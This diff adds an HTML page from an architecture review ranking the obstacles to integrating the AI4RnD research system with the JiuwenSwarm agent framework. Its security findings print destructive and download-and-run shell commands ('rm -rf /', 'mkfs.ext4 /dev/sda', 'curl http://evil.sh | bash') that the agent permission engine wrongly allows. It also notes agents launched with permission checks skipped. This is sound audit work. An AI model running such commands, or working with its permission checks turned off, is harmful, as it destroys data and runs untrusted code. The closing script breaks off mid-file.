@@ -1,0 +1,253 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Integration challenges &middot; AI4RnD &times; JiuwenSwarm</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<div class="layout">
+<aside><div class="brand"><svg class="mark" width="20" height="20" viewBox="0 0 20 20" fill="none" aria-hidden="true"><path d="M10 1.6c2.4 2.1 3.6 4.7 3.6 7.4 0 2.9-1.3 5.5-3.6 7.4-2.3-1.9-3.6-4.5-3.6-7.4 0-2.7 1.2-5.3 3.6-7.4z" fill="#cf0a2c"/><path d="M10 16.4c-2.6 1.4-5 1.7-7.2 1-.5-2.2 0-4.4 1.6-6.4 2.2.3 4.1 1.5 5.6 3.5z" fill="#a60822"/><path d="M10 16.4c2.6 1.4 5 1.7 7.2 1 .5-2.2 0-4.4-1.6-6.4-2.2.3-4.1 1.5-5.6 3.5z" fill="#7a0a1d"/></svg><h1>AI4RnD &times; JiuwenSwarm</h1></div>
+<p class="rev">Architecture review &middot; Rev 3</p>
+<div class="navsec">Start</div>
+<a class="doc" href="readme.html">Overview &amp; verdict</a>
+<a class="doc" href="15-correction-log.html">Correction log</a>
+<div class="navsec">Decision</div>
+<a class="doc" href="17-taskgraph-verdict.html">TaskGraph verdict</a>
+<a class="doc" href="19-product-layers-and-ux.html">Product layers &amp; UX</a>
+<a class="doc" href="07-architecture-options.html">Architecture options</a>
+<a class="doc" href="08-recommended-architecture.html">Recommended architecture</a>
+<a class="doc" href="18-evolution-governance.html">Evolution governance</a>
+<a class="doc" href="09-implementation-plan.html">Staged path</a>
+<div class="navsec">Product</div>
+<a class="doc" href="00-intended-product-model.html">Intended product model</a>
+<a class="doc" href="13-maturity-map.html">Maturity map</a>
+<a class="doc" href="14-reuse-vs-build-map.html">Reuse vs build</a>
+<a class="doc" href="traceability-142-feature-matrix.html">142-feature matrix</a>
+<div class="navsec">Systems</div>
+<a class="doc" href="01-jiuwenswarm-architecture.html">JiuwenSwarm architecture</a>
+<a class="doc" href="02-ai4rnd-architecture.html">AI4RnD architecture</a>
+<a class="doc" href="03-workflow-traces.html">Workflow traces</a>
+<a class="doc" href="04-component-comparison.html">Component comparison</a>
+<a class="doc" href="05-capability-matrix.html">Capability matrix</a>
+<a class="doc on" href="06-integration-challenges.html">Integration challenges</a>
+<div class="navsec">Evidence</div>
+<a class="doc" href="16-jiuwen-execution-mechanisms.html">Jiuwen execution mechanisms</a>
+<a class="doc" href="12-verification-appendix.html">Verification appendix</a>
+<a class="doc" href="11-evidence-appendix.html">Evidence appendix</a>
+<a class="doc" href="10-risks-assumptions-open-questions.html">Risks &amp; open questions</a>
+<a class="doc" href="diagrams-readme.html">Diagram index</a>
+<div class="side-foot">jiuwenswarm @ a98d7ad<br>openjiuwen 0.1.15.post3<br>AI4Research @ d35c511<br>142 features &middot; 19 experiments</div></aside>
+<main><div class="crumb">Systems / 06-integration-challenges.md</div><article><nav class="toc"><div class="toc-h">On this page</div><a class="l2" href="#1-the-extension-surface-is-narrower-than-it-looks-blocker-fo">1. The extension surface is narrower than it looks — BLOCKER for pure-plugin designs</a><a class="l3" href="#1-1-the-rail-plugin-seam-works-and-is-the-good-news">1.1 The Rail plugin seam works and is the good news ✅</a><a class="l3" href="#1-2-the-extension-rpc-path-is-closed">1.2 The extension RPC path is closed ❌</a><a class="l3" href="#1-3-harness-element-registration-is-open-inclusion-is-not">1.3 Harness element registration is open; inclusion is not ⚠️</a><a class="l2" href="#2-two-orchestration-models-that-cannot-both-be-in-charge-arc">2. Two orchestration models that cannot both be in charge — ARCHITECTURAL CONFLICT</a><a class="l2" href="#3-two-state-models-that-must-not-merge-data-conflict">3. Two state models that must not merge — DATA CONFLICT</a><a class="l2" href="#4-dangerously-skip-permissions-versus-the-permission-engine-">4. --dangerously-skip-permissions versus the permission engine — SECURITY CONFLICT</a><a class="l2" href="#5-bash-control-plane-cannot-survive-the-move-portability-blo">5. Bash control plane cannot survive the move — PORTABILITY BLOCKER</a><a class="l2" href="#6-three-overlapping-operator-concepts-vocabulary-conflict">6. Three overlapping "operator" concepts — VOCABULARY CONFLICT</a><a class="l2" href="#7-upstream-maintenance-exposure-risk-not-blocker">7. Upstream maintenance exposure — RISK, not blocker</a><a class="l2" href="#8-evidence-integrity-under-context-compaction-subtle-reliabi">8. Evidence integrity under context compaction — SUBTLE RELIABILITY RISK</a><a class="l2" href="#9-language-and-contribution-friction-operational">9. Language and contribution friction — OPERATIONAL</a><a class="l2" href="#10-plugin-execution-is-unsandboxed-in-both-systems-shared-se">10. Plugin execution is unsandboxed in both systems — SHARED SECURITY GAP</a><a class="l2" href="#11-per-operator-permissions-are-not-expressible-new-blocker">11. Per-operator permissions are not expressible — NEW BLOCKER ⭐</a><a class="l2" href="#12-the-permission-guardrail-layer-is-inert-by-default-new-bl">12. The permission guardrail layer is inert by default — NEW BLOCKER ⭐</a><a class="l2" href="#blocker-summary">Blocker summary</a></nav><h1 id="integration-challenges-and-conflict-analysis"><a class="anchor" href="#integration-challenges-and-conflict-analysis" aria-hidden="true">#</a>Integration Challenges and Conflict Analysis</h1>
+<p>The obstacles, ranked by how much they constrain the architecture choice.</p>
+<blockquote><p><strong>Revision 2.</strong> Challenge 1.1 is now <strong>verified rather than inferred</strong>, and two new blockers were found by execution. See §11 and §12 at the end of this document; both feed the blocker summary table.</p></blockquote>
+<hr>
+<h2 id="1-the-extension-surface-is-narrower-than-it-looks-blocker-fo"><a class="anchor" href="#1-the-extension-surface-is-narrower-than-it-looks-blocker-fo" aria-hidden="true">#</a>1. The extension surface is narrower than it looks — BLOCKER for pure-plugin designs</h2>
+<p>JiuwenSwarm advertises an extension system. Reading it closely, there are three distinct surfaces with very different power.</p>
+<div class="fig"><pre class="mermaid">flowchart TB
+    subgraph OUT[&quot;Out-of-tree — no core change&quot;]
+        RAIL[&quot;Rail plugin&lt;br/&gt;&amp;lt;workspace&amp;gt;/extensions/&amp;lt;n&amp;gt;/rail.py&quot;]
+        SKILL[&quot;Skill&lt;br/&gt;skills/&amp;lt;n&amp;gt;/SKILL.md&quot;]
+        MCP[&quot;MCP server&quot;]
+        HOOK[&quot;User hooks (config.hooks)&quot;]
+    end
+    subgraph HALF[&quot;In-tree module with a manifest&quot;]
+        EXTP[&quot;Extension package&lt;br/&gt;jiuwenswarm/extensions/&amp;lt;n&amp;gt;/&quot;]
+    end
+    subgraph CORE[&quot;Core-tree change required&quot;]
+        ENUM[&quot;ReqMethod enum&lt;br/&gt;common/schema/message.py&quot;]
+        FSET[&quot;_SYMPHONY_METHODS frozenset&lt;br/&gt;agent_adapter/interface.py:437&quot;]
+        CFGS[&quot;config_specs.py element name lists&quot;]
+    end
+    subgraph UP[&quot;Upstream openjiuwen&quot;]
+        LOADER[&quot;config-driven harness loader&lt;br/&gt;(DESIGN.md §15 — future work)&quot;]
+    end
+
+    RAIL --&gt;|&quot;init(agent) → add_ability()&quot;| TOOLS[&quot;agent tools ✅&quot;]
+    RAIL --&gt;|&quot;lifecycle hooks&quot;| LC[&quot;before/after model+tool call ✅&quot;]
+    EXTP --&gt;|&quot;register_rpc_handler&quot;| INPROC[&quot;callable in-process ✅&quot;]
+    INPROC -.-&gt;|&quot;NOT callable from WS&quot;| ENUM
+    ENUM --&gt; FSET
+    EXTP --&gt;|&quot;6 hook events&quot;| HOOKS[&quot;gateway/agentserver lifecycle ✅&quot;]
+    CFGS -.-&gt;|&quot;gates inclusion of&quot;| HARN[&quot;@harness_element registrations&quot;]</pre></div>
+<h3 id="1-1-the-rail-plugin-seam-works-and-is-the-good-news"><a class="anchor" href="#1-1-the-rail-plugin-seam-works-and-is-the-good-news" aria-hidden="true">#</a>1.1 The Rail plugin seam works and is the good news ✅</h3>
+<p><code>RailManager</code> loads <code>rail.py</code> from <code>&lt;agent_workspace&gt;/extensions/&lt;name&gt;/</code>, validates that it contains a class inheriting <code>DeepAgentRail</code> or <code>AgentRail</code>, compiles it, and can register/unregister it on a <strong>live</strong> <code>DeepAgent</code> via <code>hot_reload_rail</code>. Four <code>agent_ws_server</code> handlers drive import/delete/toggle/list. <span class="tag">E-J09</span></p>
+<p>And a Rail's <code>init(agent)</code> can add tools:</p>
+<pre><code>for tool in tools:
+    agent.ability_manager.add_ability(tool.card, tool)</code></pre>
+<p>— <code>MemberSkillToolkitRail</code>, <code>jiuwenswarm/agents/harness/team/rails/team_member_skill_toolkit_rail.py:53-55</code>. <span class="tag">E-J10</span></p>
+<p><strong>Consequence:</strong> an AI4RnD integration can add research tools and hook every lifecycle event without touching the core tree. This is what makes a non-fork architecture viable.</p>
+<h3 id="1-2-the-extension-rpc-path-is-closed"><a class="anchor" href="#1-2-the-extension-rpc-path-is-closed" aria-hidden="true">#</a>1.2 The extension RPC path is closed ❌</h3>
+<p><code>ExtensionRegistry.register_rpc_handler(method, handler)</code> accepts any string method. But reaching it from outside the process requires <em>both</em>:</p>
+<pre><code># jiuwenswarm/server/runtime/agent_adapter/interface.py:437
+_SYMPHONY_METHODS: frozenset[ReqMethod] = frozenset({
+    ReqMethod.SYMPHONY_BUILD_SCORE, ReqMethod.SYMPHONY_PAUSE_BUILD,
+    ReqMethod.SYMPHONY_SCORE_STATUS, ReqMethod.SYMPHONY_GRAPH, ReqMethod.SYMPHONY_PLAN,
+})
+
+# interface.py:1400
+if request.req_method not in _SYMPHONY_METHODS:
+    return None</code></pre>
+<p>plus enum membership in <code>jiuwenswarm/common/schema/message.py:116-120</code>. <span class="tag">E-J08</span></p>
+<p>Both are core-tree files. There is no generic <code>extension.*</code> passthrough. So "extension" in JiuwenSwarm means "in-tree module with a manifest and auto-installed dependencies", not "third-party plugin with a stable versioned API".</p>
+<p><strong>Mitigation:</strong> in-process callers <em>can</em> dispatch by string — <code>symphony_toolkits.py:47</code> does <code>registry.get_rpc_handler(method)</code> <span class="tag">E-J18</span>. So a Rail-registered tool can call extension RPC handlers freely. The closed path only blocks <em>external</em> callers, which the recommended architecture does not need.</p>
+<p><strong>Residual cost:</strong> a small in-tree patch (2 files, ~10 lines) is needed if the research service must be driven from the web UI rather than only from the agent. Treat as an upstream contribution candidate.</p>
+<h3 id="1-3-harness-element-registration-is-open-inclusion-is-not"><a class="anchor" href="#1-3-harness-element-registration-is-open-inclusion-is-not" aria-hidden="true">#</a>1.3 Harness element registration is open; inclusion is not ⚠️</h3>
+<p><code>@harness_element</code> + <code>register_from_catalog()</code> writes into <code>openjiuwen</code>'s process-global <code>dict[str, Callable]</code> registries. An out-of-tree module can register. But <code>config_specs.py</code> holds hardcoded lists (<code>_COMMON_RAIL_NAMES</code>, <code>_CODE_RAIL_NAMES</code>, <code>_COMMON_TOOL_NAMES</code>, …) that decide which names are folded into a member's <code>DeepAgentSpec</code>. Registering without being listed is a no-op. The "configuration-file → harness loader" that would fix this is explicitly <strong>future work</strong> in <code>DESIGN.md</code> §15. <span class="tag">E-J05</span></p>
+<p><strong>Consequence:</strong> the elegant declarative assembly system is <em>not</em> an out-of-tree extension point today. Adding a first-class swarm element means editing <code>config_specs.py</code>, which means an in-tree change and a merge conflict on every upstream rebase.</p>
+<hr>
+<h2 id="2-two-orchestration-models-that-cannot-both-be-in-charge-arc"><a class="anchor" href="#2-two-orchestration-models-that-cannot-both-be-in-charge-arc" aria-hidden="true">#</a>2. Two orchestration models that cannot both be in charge — ARCHITECTURAL CONFLICT</h2>
+<div class="tw"><table><thead><tr><th></th><th>JiuwenSwarm</th><th>AI4RnD</th></tr></thead><tbody><tr><td>Unit of work</td><td>conversational turn / task-loop round</td><td>DAG node in a sprint</td></tr><tr><td>Progress trigger</td><td>model emits, loop evaluates</td><td>file appears, poller detects</td></tr><tr><td>Coupling</td><td>in-process objects</td><td>filesystem</td></tr><tr><td>Worker selection</td><td>role + configured elements</td><td>capability match</td></tr><tr><td>Completion</td><td>stop evaluator</td><td>gate verdict recorded in a ledger</td></tr><tr><td>Failure</td><td>exception → rail repairs context</td><td>verdict FAIL → status transition → re-dispatch</td></tr></tbody></table></div>
+<p>Running both is not possible without one becoming subordinate. Three resolutions:</p>
+<ol><li><strong>JiuwenSwarm's loop is primary; AI4RnD's DAG runs inside a tool call.</strong> The agent calls <code>research_run(...)</code>; the research service executes its own DAG internally and returns. Simple, works today, but AI4RnD's DAG cannot dispatch back to JiuwenSwarm agents.</li><li><strong>AI4RnD's DAG is primary; JiuwenSwarm agents are workers.</strong> Requires an external API to drive JiuwenSwarm agents — blocked by §1.2 without a core patch, and inverts the ownership of session, permission and channel state.</li><li>**Two-level: JiuwenSwarm owns the outer loop; the research DAG owns research-internal scheduling and calls <em>back</em> into JiuwenSwarm agents for node execution.** Most powerful, most complex, and needs the §1.2 patch plus a callback contract.</li></ol>
+<p>The recommendation takes (1) for stage 1 and (3) as the target — see <a href="08-recommended-architecture.html">08-recommended-architecture.md</a>.</p>
+<hr>
+<h2 id="3-two-state-models-that-must-not-merge-data-conflict"><a class="anchor" href="#3-two-state-models-that-must-not-merge-data-conflict" aria-hidden="true">#</a>3. Two state models that must not merge — DATA CONFLICT</h2>
+<p>JiuwenSwarm's durable state is a <strong>session</strong>: a chat transcript plus metadata, memory index and skills. AI4RnD's is a <strong>run bundle</strong>: typed, content-hashed, schema-validated artifacts under <code>runs/&lt;run_id&gt;/</code>.</p>
+<p>Merging them would be wrong in both directions:</p>
+<ul><li>Putting evidence into the session makes it un-queryable, un-hashable, and subject to</li></ul>
+<p>context compaction and session rewind. A <code>/compact</code> must never be able to delete evidence.</p>
+<ul><li>Putting conversation into the run bundle duplicates a working system.</li></ul>
+<p><strong>Resolution:</strong> keep them separate, linked by <code>run_id</code> stored in session metadata. State explicitly that <em>the run bundle is the source of truth for evidence, claims and verdicts; the session is the source of truth for conversation and user intent.</em></p>
+<p><strong>Consequences to design for:</strong></p>
+<ul><li>Session rewind must not orphan a run. Rewinding past the turn that started a run leaves</li></ul>
+<p>the run alive — decide whether to cancel, detach or keep it.</p>
+<ul><li>Session deletion and run retention need separate policies (research artifacts likely</li></ul>
+<p>outlive conversations).</p>
+<ul><li>Multi-channel session sharing means several users may observe one run.</li></ul>
+<hr>
+<h2 id="4-dangerously-skip-permissions-versus-the-permission-engine-"><a class="anchor" href="#4-dangerously-skip-permissions-versus-the-permission-engine-" aria-hidden="true">#</a>4. <code>--dangerously-skip-permissions</code> versus the permission engine — SECURITY CONFLICT</h2>
+<p>AI4RnD's shipped workers launch as <code>claude --dangerously-skip-permissions --model opus</code> <span class="tag">E-A05</span> and receive instructions by <code>tmux send-keys</code> with no permission check <span class="tag">E-A08</span>. JiuwenSwarm evaluates every tool call through a tiered policy engine with non-overridable built-in denials, and can run the whole execution inside bwrap/cgroup <span class="tag">E-J11</span>, <span class="tag">E-J12</span>.</p>
+<p>These are not reconcilable. Any design that ports AI4RnD's dispatcher into JiuwenSwarm regresses the security posture of the combined system to AI4RnD's.</p>
+<p><strong>Resolution: AI4RnD's dispatch layer does not come across.</strong> Research operators execute as JiuwenSwarm tool calls, governed normally.</p>
+<p><strong>Note the direction of benefit.</strong> Research operators fetch and parse untrusted web content — arguably a stronger case for sandboxing than coding agents, since the input is adversarial by default. Prompt injection through a fetched source is a live risk for any research pipeline; jiuwenbox's network policy and the permission engine are exactly the mitigations AI4RnD currently lacks.</p>
+<hr>
+<h2 id="5-bash-control-plane-cannot-survive-the-move-portability-blo"><a class="anchor" href="#5-bash-control-plane-cannot-survive-the-move-portability-blo" aria-hidden="true">#</a>5. Bash control plane cannot survive the move — PORTABILITY BLOCKER</h2>
+<p><code>coordinator.sh</code> (5,797 LOC) and <code>solar-harness.sh</code> (6,119 LOC) encode a large amount of orchestration logic in bash, with macOS-specific assumptions (<code>stat -f %m</code>, <code>osascript</code> notifications, launchd plists). JiuwenSwarm is a Python package supporting Windows, macOS and Linux, distributed via pip and signed desktop apps.</p>
+<p>The logic worth keeping (state machine, routing, gate ledger) already exists in the Python modules (<code>graph_scheduler.py</code>, <code>gate_ledger.py</code>, <code>verification_gate.py</code>); the bash is mostly dispatch and polling — the parts being dropped anyway. But <code>coordinator.sh</code> also holds the self-healing and compensation logic, which would need re-deriving if any of it turns out to be load-bearing beyond substrate compensation.</p>
+<p>**Estimated bash to port: near zero. Estimated bash to <em>read carefully first</em>: all of it**, because the post-mortems in <code>DISPATCH-PROTOCOL.md</code> document behaviours the Python modules assume.</p>
+<hr>
+<h2 id="6-three-overlapping-operator-concepts-vocabulary-conflict"><a class="anchor" href="#6-three-overlapping-operator-concepts-vocabulary-conflict" aria-hidden="true">#</a>6. Three overlapping "operator" concepts — VOCABULARY CONFLICT</h2>
+<p>Within AI4RnD alone:</p>
+<div class="tw"><table><thead><tr><th>Module</th><th>Concept</th></tr></thead><tbody><tr><td><code>logical_operator_registry.py</code></td><td>operator <em>types</em> with required capabilities</td></tr><tr><td><code>physical_operator_catalog.py</code></td><td>concrete <em>workers</em> with declared capabilities</td></tr><tr><td><code>operator_router.py</code></td><td><em>scripts</em> dispatched per named "line" (a scheduled-job runner from the AI-influence subsystem)</td></tr></tbody></table></div>
+<p>Plus <code>operator_runtime.py</code>, <code>operator_state_machine.py</code>, <code>operator_persona.py</code>, <code>operator_score.py</code>, <code>operator_flow_control.py</code>, <code>skill_operator_registry.py</code>, <code>logical_operator_router.py</code>, <code>operator_schedule_binder.py</code>, <code>operator_model_selection.py</code>, <code>operator_registry_loader.py</code>.</p>
+<p>Then JiuwenSwarm adds a <em>fourth</em> meaning: harness elements with provider factories.</p>
+<p><strong>Consequence:</strong> any integration must pick one vocabulary and rename the rest. Left unresolved, this generates persistent confusion in code review, and there is real risk of porting the wrong "operator" module. <code>operator_router.py</code> in particular looks central by name and is not — it belongs to the AI-influence digest subsystem.</p>
+<p><strong>Resolution:</strong> adopt JiuwenSwarm's <code>element</code> for constructed capabilities, keep <code>logical operator</code> / <code>physical operator</code> strictly for routing, and rename AI4RnD's <code>operator_router.py</code> on port (or leave it behind — it is not needed).</p>
+<hr>
+<h2 id="7-upstream-maintenance-exposure-risk-not-blocker"><a class="anchor" href="#7-upstream-maintenance-exposure-risk-not-blocker" aria-hidden="true">#</a>7. Upstream maintenance exposure — RISK, not blocker</h2>
+<p>An integrator building on JiuwenSwarm is exposed to <strong>two</strong> upstream projects:</p>
+<div class="tw"><table><thead><tr><th>Upstream</th><th>Exposure</th></tr></thead><tbody><tr><td><code>openJiuwen-ai/jiuwenswarm</code></td><td>version 0.2.x, pre-1.0. Recent history shows renames (JiuwenClaw → JiuwenSwarm at v0.2.0) and active refactoring of the swarm assembly layer</td></tr><tr><td><code>openjiuwen</code> (pinned <code>==0.1.15.post3</code>)</td><td>0.1.x, pre-1.0, <strong>not vendored, not readable in this repository</strong>. Holds <code>DeepAgent</code>, rails, permission engine, the harness manifest framework and built-in elements</td></tr></tbody></table></div>
+<p>Signals of instability in the swarm layer itself, from <code>DESIGN.md</code>:</p>
+<ul><li>"openjiuwen has removed the class registry" — a registration mechanism was deleted</li><li>"已下沉到 openjiuwen" — the manifest framework was <em>moved upstream</em> mid-development</li><li>§15 lists six unfinished items including the config-driven loader and "upstream</li></ul>
+<p>openjiuwen alignment"</p>
+<p><strong>Implications:</strong></p>
+<ul><li>Any in-tree change to <code>config_specs.py</code> or <code>interface.py</code> will conflict on rebase.</li><li><code>openjiuwen</code> API changes can break a Rail plugin without warning, since <code>DeepAgentRail</code></li></ul>
+<p>and <code>ability_manager</code> are its interfaces, not JiuwenSwarm's.</p>
+<ul><li>Pinning <code>openjiuwen</code> protects against drift but forfeits fixes.</li></ul>
+<p><strong>Mitigation:</strong> minimise in-tree footprint; wrap <code>openjiuwen</code> interfaces behind a thin adapter in the integration layer so an upstream break is one file to fix; contribute the RPC-passthrough patch upstream rather than carrying it.</p>
+<hr>
+<h2 id="8-evidence-integrity-under-context-compaction-subtle-reliabi"><a class="anchor" href="#8-evidence-integrity-under-context-compaction-subtle-reliabi" aria-hidden="true">#</a>8. Evidence integrity under context compaction — SUBTLE RELIABILITY RISK</h2>
+<p>JiuwenSwarm actively compacts context (<code>/compact</code>, <code>/compact-partial</code>, context engine) and supports session rewind including file restoration. AI4RnD's model assumes artifacts are immutable and content-hashed.</p>
+<p>If evidence or citation data ever travels through the conversation as text — for example a tool returning full evidence records into the transcript — compaction can silently drop or summarise it, and a later citation-rendering step may cite something no longer present.</p>
+<p><strong>Resolution:</strong> research tools must return <em>references</em> (<code>evidence_id</code>, <code>claim_id</code>, <code>run_id</code>), never bulk evidence text. The model reasons over ids and short summaries; the service resolves them. This must be a hard rule in the tool contract, not a convention.</p>
+<hr>
+<h2 id="9-language-and-contribution-friction-operational"><a class="anchor" href="#9-language-and-contribution-friction-operational" aria-hidden="true">#</a>9. Language and contribution friction — OPERATIONAL</h2>
+<ul><li>JiuwenSwarm's code comments, design documents and log messages are substantially Chinese</li></ul>
+<p>(<code>DESIGN.md</code> entirely so). AI4RnD mixes Chinese and English.</p>
+<ul><li>JiuwenSwarm targets a Huawei-internal lint standard (<code>huawei-python-lint</code> referenced as a</li></ul>
+<p>compliance gate in <code>DESIGN.md</code> §14) alongside ruff/pylint/mypy/codespell.</p>
+<ul><li>Upstream contribution is via GitCode, not GitHub — the canonical repository is</li></ul>
+<p><code>gitcode.com/openJiuwen/jiuwenswarm</code>.</p>
+<p>None of these blocks anything; all raise the cost of upstreaming and of onboarding contributors who read only English.</p>
+<hr>
+<h2 id="10-plugin-execution-is-unsandboxed-in-both-systems-shared-se"><a class="anchor" href="#10-plugin-execution-is-unsandboxed-in-both-systems-shared-se" aria-hidden="true">#</a>10. Plugin execution is unsandboxed in both systems — SHARED SECURITY GAP</h2>
+<p>JiuwenSwarm validates <code>rail.py</code> by regex and <code>compile()</code>, then executes it with full agent-server privileges <span class="tag">E-J09</span>. <code>ExtensionLoader._install_dependencies</code> runs <code>pip install</code> / <code>uv pip install</code> on manifest-declared dependencies, logging failures rather than raising <span class="tag">E-J17</span>. AI4RnD has no plugin isolation either.</p>
+<p>Since the recommended architecture <em>depends</em> on the Rail plugin mechanism, this gap is inherited. It is acceptable for a first-party integration (the plugin is your own code) but must not be presented as a general third-party plugin story.</p>
+<hr>
+<h2 id="11-per-operator-permissions-are-not-expressible-new-blocker"><a class="anchor" href="#11-per-operator-permissions-are-not-expressible-new-blocker" aria-hidden="true">#</a>11. Per-operator permissions are not expressible — <strong>NEW BLOCKER</strong> ⭐</h2>
+<p>The intended product governs permissions <strong>per operator</strong>: capsules declare <code>effects</code> (read/write/execute/network/cost), logical operators declare write scope, and the six evaluator families include a security/privacy/compliance evaluator that must be able to constrain what a given operator may do.</p>
+<p>JiuwenSwarm cannot express this. <span class="tag">V-6</span></p>
+<ul><li>Exactly two member roles: <code>_MEMBER_ROLES = ("leader", "teammate")</code> (<code>assembly.py:40</code>).</li><li>Rail <em>composition</em> varies by role, but permission <em>policy values</em> come from one global</li></ul>
+<p><code>config.permissions</code>.</p>
+<ul><li>Neither <code>evaluate_tiered_policy</code> nor <code>harness/security/core.py</code> references <code>member</code>,</li></ul>
+<p><code>agent_id</code> or <code>role</code>.</p>
+<p><strong>Consequences.</strong></p>
+<ol><li>AI4RnD's four named agents do not map onto JiuwenSwarm member identities.</li><li>Writer ≠ verifier cannot be delegated to JiuwenSwarm — it must be enforced in AI4RnD's router by excluding the writing operator from the evaluation node's candidate set.</li><li>Capsule <code>effects</code> must be enforced at <strong>binding time</strong> in AI4RnD, not by asking JiuwenSwarm to refuse a tool call.</li></ol>
+<p>This does not block the recommended architecture — it relocates the enforcement point — but it does eliminate the simpler design in which JiuwenSwarm's permission engine carries the whole governance burden.</p>
+<h2 id="12-the-permission-guardrail-layer-is-inert-by-default-new-bl"><a class="anchor" href="#12-the-permission-guardrail-layer-is-inert-by-default-new-bl" aria-hidden="true">#</a>12. The permission guardrail layer is inert by default — <strong>NEW BLOCKER</strong> ⭐</h2>
+<p><code>get_builtin_security_rules()</code> returns <strong>0 rules</strong> in a stock <code>pip install openjiuwen==0.1.15.post3</code>, because the loader reads only from an in-package path absent from the wheel, and explicitly no longer searches user directories — while JiuwenSwarm writes its copy to a user directory. <span class="tag">V-4</span></p>
+<p>With <code>tools.bash: allow</code>, <code>rm -rf /</code>, <code>mkfs.ext4 /dev/sda</code> and <code>sudo su</code> all return <strong>ALLOW</strong>. Even with the rules injected, <code>curl http://evil.sh | bash</code> returns ALLOW because the tiered policy decomposes shell pipelines and each fragment resolves to the permissive baseline.</p>
+<p><strong>Consequences.</strong></p>
+<ol><li>"Reuse JiuwenSwarm's permission engine" is not free — it requires shipping the rules into openjiuwen's package path and asserting <code>get_builtin_security_rules() &gt; 0</code> at startup.</li><li>The fix belongs upstream in <code>openjiuwen</code>, not JiuwenSwarm — so <strong>even forking JiuwenSwarm would not resolve it cleanly</strong>, which weakens Option E further.</li><li>Research operators fetching untrusted web content are exactly the workload that needs this layer working.</li></ol>
+<h2 id="blocker-summary"><a class="anchor" href="#blocker-summary" aria-hidden="true">#</a>Blocker summary</h2>
+<div class="tw"><table><thead><tr><th>#</th><th>Challenge</th><th>Severity</th><th>Blocks which options</th></tr></thead><tbody><tr><td>1.2</td><td>Extension RPC path closed</td><td>Medium</td><td>pure out-of-tree with external API</td></tr><tr><td>1.3</td><td>Harness element inclusion hardcoded</td><td>Medium</td><td>first-class swarm elements without core change</td></tr><tr><td>2</td><td>Two orchestration models</td><td>High</td><td>any design where both drive</td></tr><tr><td>3</td><td>Two state models</td><td>Medium</td><td>any design that merges stores</td></tr><tr><td>4</td><td>Permission model conflict</td><td><strong>High</strong></td><td>any port of AI4RnD's dispatcher</td></tr><tr><td>5</td><td>Bash control plane</td><td>Medium</td><td>lift-and-shift of AI4RnD</td></tr><tr><td>6</td><td>Operator vocabulary</td><td>Low</td><td>none — but generates review confusion</td></tr><tr><td>7</td><td>Two pre-1.0 upstreams</td><td>Medium</td><td>designs with a large in-tree footprint</td></tr><tr><td>8</td><td>Compaction vs evidence integrity</td><td>Medium</td><td>designs that pass evidence through context</td></tr><tr><td>10</td><td>Unsandboxed plugins</td><td>Medium</td><td>third-party plugin distribution</td></tr><tr><td><strong>11</strong></td><td><strong>Per-operator permissions not expressible</strong></td><td><strong>High</strong></td><td>delegating governance to JiuwenSwarm; forces router-side enforcement</td></tr><tr><td><strong>12</strong></td><td><strong>Built-in guardrails load 0 rules</strong></td><td><strong>High</strong></td><td>assuming the permission layer is active; weakens Option E</td></tr></tbody></table></div>
+<p><strong>None of these blocks the integration outright.</strong> Together they rule out three of the seven architecture options and shape the rest — see <a href="07-architecture-options.html">07-architecture-options.md</a>. Blockers 11 and 12 are new in Revision 2 and were invisible from source reading alone; both were found by execution.</p></article><div class="pager"><a href="05-capability-matrix.html"><div class="d">← Previous</div><div class="t">Capability matrix</div></a><a class="nx" href="12-verification-appendix.html"><div class="d">Next →</div><div class="t">Verification appendix</div></a></div></main>
+</div>
+<button class="tt" id="tt" aria-label="Toggle colour theme">&#9689;</button>
+<script src="vendor/mermaid.min.js"></script>
+<script>
+(function(){
+  var KEY='ai4rnd-theme', r=document.documentElement;
+  var saved=localStorage.getItem(KEY); if(saved) r.setAttribute('data-theme',saved);
+  function dark(){ var a=r.getAttribute('data-theme');
+    return a? a==='dark' : matchMedia('(prefers-color-scheme:dark)').matches; }
+  document.getElementById('tt').onclick=function(){
+    var next = dark()?'light':'dark';
+    r.setAttribute('data-theme',next); localStorage.setItem(KEY,next);
+    location.reload();
+  };
+
+  var FONT='"Schibsted Grotesk",-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif';
+  var LIGHT={background:'#ffffff',mainBkg:'#fafafb',primaryColor:'#fafafb',
+    primaryTextColor:'#1a1b1d',primaryBorderColor:'#d3d4d9',secondaryColor:'#f4f4f6',
+    secondaryTextColor:'#1a1b1d',secondaryBorderColor:'#d3d4d9',tertiaryColor:'#ffffff',
+    tertiaryTextColor:'#1a1b1d',tertiaryBorderColor:'#e6e6ea',
+    nodeBorder:'#d3d4d9',clusterBkg:'#ffffff',clusterBorder:'#e6e6ea',
+    lineColor:'#8b8d94',textColor:'#1a1b1d',titleColor:'#a60822',
+    edgeLabelBackground:'#ffffff',labelBackground:'#ffffff',
+    noteBkgColor:'#f4f4f6',noteTextColor:'#54565c',noteBorderColor:'#e6e6ea',
+    actorBkg:'#fafafb',actorBorder:'#d3d4d9',actorTextColor:'#1a1b1d',
+    signalColor:'#54565c',signalTextColor:'#1a1b1d',
+    labelBoxBkgColor:'#f4f4f6',labelBoxBorderColor:'#d3d4d9',labelTextColor:'#1a1b1d',
+    loopTextColor:'#54565c',altBackground:'#fafafb',
+    sectionBkgColor:'#f4f4f6',sectionBkgColor2:'#fafafb',altSectionBkgColor:'#ffffff',
+    taskBkgColor:'#f4f4f6',taskBorderColor:'#d3d4d9',taskTextColor:'#1a1b1d',
+    taskTextDarkColor:'#1a1b1d',taskTextOutsideColor:'#54565c',
+    activeTaskBkgColor:'#cf0a2c',activeTaskBorderColor:'#a60822',
+    doneTaskBkgColor:'#e6e6ea',doneTaskBorderColor:'#d3d4d9',
+    critBkgColor:'#fbefd0',critBorderColor:'#b26a00',
+    gridColor:'#e6e6ea',todayLineColor:'#cf0a2c',
+    transitionColor:'#8b8d94',stateBkg:'#fafafb',stateBorder:'#d3d4d9'};
+  var DARK={background:'#131316',mainBkg:'#191a1d',primaryColor:'#191a1d',
+    primaryTextColor:'#e8e8ea',primaryBorderColor:'#3a3b40',secondaryColor:'#1f2024',
+    secondaryTextColor:'#e8e8ea',secondaryBorderColor:'#3a3b40',tertiaryColor:'#131316',
+    tertiaryTextColor:'#e8e8ea',tertiaryBorderColor:'#2a2b30',
